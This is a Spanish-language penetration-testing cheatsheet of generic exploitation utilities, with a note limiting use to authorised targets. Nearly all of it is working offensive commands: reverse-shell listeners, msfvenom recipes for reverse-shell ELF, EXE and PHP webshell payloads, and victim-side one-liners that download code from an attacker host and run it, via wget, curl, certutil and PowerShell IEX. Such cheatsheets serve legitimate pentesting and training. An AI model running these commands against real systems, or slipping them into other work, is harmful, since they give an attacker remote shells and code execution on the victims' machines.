# Cheatsheet · Explotación (utilidades genéricas)

Aquí **no** hay payloads por tipo de vuln (eso está en `../por-vuln/`). Esto son las utilidades
transversales que necesitas al explotar: recibir shells, generar payloads y mover ficheros.
Ver también: [reverse-shells](../transversal/reverse-shells.md) y [tty-upgrade](../transversal/tty-upgrade.md).
**Solo sobre objetivos autorizados.**

## Listeners (recibir la shell)

```bash
nc -lvnp 443                       # básico
rlwrap nc -lvnp 443                # con historial/edición (mejor)
# pwncat-cs: listener que ya estabiliza la TTY solo
pwncat-cs -lp 443
# metasploit multi/handler
msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST TU_IP; set LPORT 443; run"
```

## Generar payloads (msfvenom)

```bash
# Linux ELF
msfvenom -p linux/x64/shell_reverse_tcp LHOST=TU_IP LPORT=443 -f elf -o shell.elf
# Windows EXE
msfvenom -p windows/x64/shell_reverse_tcp LHOST=TU_IP LPORT=443 -f exe -o shell.exe
# Webshell PHP
msfvenom -p php/reverse_php LHOST=TU_IP LPORT=443 -f raw -o shell.php
# listar formatos / payloads
msfvenom --list formats ; msfvenom --list payloads | grep php
```

## Servir ficheros desde tu máquina

```bash
python3 -m http.server 80          # HTTP en el puerto 80
php -S 0.0.0.0:80                   # alternativa con PHP
# SMB (útil para Windows)
impacket-smbserver share $(pwd) -smb2support
```

## Descargar en la víctima

```bash
# Linux
wget http://TU_IP/shell.elf -O /tmp/s && chmod +x /tmp/s && /tmp/s
curl http://TU_IP/shell.elf -o /tmp/s && chmod +x /tmp/s && /tmp/s

# Windows
certutil -urlcache -f http://TU_IP/shell.exe shell.exe
powershell -c "Invoke-WebRequest http://TU_IP/shell.exe -OutFile shell.exe"
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://TU_IP/x.ps1')"
```

## Encoding / helpers rápidos

```bash
echo -n 'payload' | base64                     # codificar
echo 'cGF5bG9hZA==' | base64 -d                 # decodificar
# URL-encode rápido con python
python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "payload con espacios"
```

## PoC segura (recordatorio)

```bash
# demuestra RCE con algo inocuo, NO toques nada:
id; whoami; hostname; uname -a
```

## Notas

- Usa el puerto 443/80 para tus listeners: suelen estar permitidos en firewalls de salida.
- `rlwrap` o `pwncat` te ahorran el baile de estabilizar la TTY a mano.
- Registra cada acción (comando + hora) para el informe y para poder revertir.
